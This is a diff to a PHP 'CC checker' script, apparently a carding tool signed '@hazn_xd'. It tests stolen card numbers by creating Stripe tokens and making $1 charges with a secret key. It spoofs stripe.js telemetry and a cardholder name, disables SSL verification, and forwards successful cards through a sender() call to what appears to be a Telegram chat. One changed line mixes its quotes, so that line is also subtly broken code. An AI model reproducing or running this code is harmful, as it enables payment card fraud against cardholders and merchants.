@@ -53,7 +53,7 @@ while(true)
 
 $ch = curl_init();  
 
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');  
 
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
 
@@ -65,7 +65,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=".$cc."&card[exp_month]=".$mes."&card[exp_year]=".$ano."&card[name]=Mia_Lovevly&time_on_page=318234&pasted_fields=number&guid=89d6b42d-4f8f-4818-8911-102cd4faa126b363dc&muid=a459ed93-97b5-4bc1-84a2-34e2d168434a98bbb1&sid=f3e87598-61c5-4f17-9664-f055711e0fdcf46c45&payment_user_agent=stripe.js%2F78ef418');  
 
 $result1 = curl_exec($ch);  
 
@@ -100,7 +100,7 @@ while(true)
 
 $ch = curl_init();  
 
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');  
 
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
 
@@ -112,7 +112,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Hazn Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&source='.$tok1.'&description=mia_checker');  
 	
 $result2 = curl_exec($ch);  
 
@@ -141,7 +141,7 @@ break;
 
 //=================== [ RESPONSES ] ===================//
 
-if(strpos($result2, '"seller_message": "Payment complete."' )) {
+if(strpos($result2, '"status": "succeeded"' )) {
     echo 'CHARGED</span>  </span>CC:<br>'.$lista.'</span><br>➤ Message: CCN $1 Charged ✅<br>➤ Receipt : <a href='.$receipturl.'>Here</a></br>➤ Made By @hazn_xd';
     sender('1320233599',"CC > ".$list."<br>Message : Payment Complete ✅<br>Receipt : <a href=".$receipturl.">Click Me</a><br>Hit Sender Of Hazn Checker<br>Check By @hazn_xd<br>");
 }
